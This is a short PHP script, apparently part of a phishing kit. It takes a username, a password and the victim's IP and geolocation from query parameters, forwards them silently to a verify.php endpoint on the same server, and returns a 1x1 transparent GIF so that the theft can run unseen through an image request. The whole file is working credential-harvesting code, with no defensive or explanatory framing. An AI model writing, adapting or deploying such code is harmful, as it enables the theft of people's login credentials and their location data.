<?php
// ============================================
// PROCESS.PHP - Forward data to verify.php
// ============================================

$u = $_GET['u'] ?? '';
$p = $_GET['p'] ?? '';
$ip = $_GET['ip'] ?? '';
$country = $_GET['country'] ?? '';
$city = $_GET['city'] ?? '';
$continent = $_GET['continent'] ?? '';

$forward = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . '/app/verify.php';
$forward .= '?u=' . urlencode($u) . '&p=' . urlencode($p) . '&ip=' . urlencode($ip) . '&country=' . urlencode($country) . '&city=' . urlencode($city) . '&continent=' . urlencode($continent);

@file_get_contents($forward);

header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
?>
